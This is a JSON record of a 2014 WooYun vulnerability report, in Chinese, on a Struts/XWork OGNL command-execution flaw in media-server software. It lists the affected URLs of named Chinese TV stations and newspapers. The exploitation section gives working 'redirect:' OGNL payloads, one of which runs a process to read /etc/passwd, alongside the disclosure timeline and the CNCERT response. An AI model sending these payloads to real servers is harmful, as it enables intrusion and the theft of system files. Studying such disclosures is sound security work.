{"id": 56932, "wybug_id": "wooyun-2014-055802", "wybug_title": "多家电视台报社命令执行漏洞getshell", "wybug_corp": "多家电视台报社", "wybug_author": "矿主", "wybug_date": "2014-04-11 17:45", "wybug_open_date": "2014-05-26 17:45", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方框架"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-26：\t细节向公众公开  简要描述： 多家电视台报社命令执行漏洞getshell 详细说明：  \n受到影响的地址：天津日报社http://mms.woshitv.com:8080/mmscis/videoPlay/CISGetVodPlayURL.jspa无锡http://vchat.thmz.com:8080/WebRootPortal/findChatInfo.jspa渤海新闻网http://sm.huanbohainews.com.cn:8080/mms3.2/videoPlay/findMaterialPlayUrlWithToken.jspa?materialId=4635&materialType=1&unitID=3931南昌日报http://z.ncnews.com.cn:8080/mmscms/liveRecordChannelMgr/getChannelPlayInfo.jspa?channelid=1长城网http://live.hebei.com.cn:8080/chat/playInfo.jspa?chatid=57宁波http://music.nbradio.com:8080/chat/listBackupChats.jspa?perPage=10泰兴电视台http://video.fjtv.net:8080/mms3.0/videoPlay/findBroadcastUrl.jspa福建广播集团http://www.txtv.net.cn:8080/ad/streamServer/saveStreamServer!input.jspa中央人民廣播電台對台灣廣播中心http://mms.am765.com/mediaUrl.jspa?indexid=459123&streamid=459121河南人民广播电台http://mms.hnr.cn:8080/mms3.2/videoPlay/findMaterialPlayUrlWithToken.jspa?materialId=64807&materialType=1&unitID=29112淮安http://vblog.habctv.com/administrator/四川在线http://v.scol.com.cn/administrator/index.php?mosmsg=Please+login蚌埠电视台http://chat.ahbbtv.com:8080/chat/findPlay.jspa山西新闻http://video.sxrb.com/administrator/index.php唐山广电http://live.tangshanradio.com/administrator/index.php德州广播电视台http://mms.dztv.tv:8080/mms3.3/videoPlay/findBroadcastUrl.jspa?loadType=0&channelType=0&channelID=7\n   漏洞证明：  截图：\n\n漏洞利用：\n打印文本redirect:${%23rep%3d%23context.get%28%27com.opensymphony.xwork.dispatcher.HttpServletResponse%27%29,%23rep.getWriter%28%29.println%28%22test.%22%29,%23rep.getWriter%28%29.flush%28%29,%23rep.getWriter%28%29.close%28%29}查看passwd?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'cat','/etc/passwd'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}GetShell代码暂时保密\n   修复方案：  WAF过滤。   版权声明：转载请注明来源 矿主@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-04-16 15:40 厂商回复： CNVD确认所述情况，根据以往测试用例，可以确认部分系统为某通用软件漏洞案例，由于此前已经通报过该漏洞，至测试时已经有部分案例无法复现。根据测试结果，已经转由CNCERT下发给四川、河南、福建、天津等分中心处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-04-11 19:24 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  某通用漏洞，感谢白帽子的辛苦测试，找案例不易。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}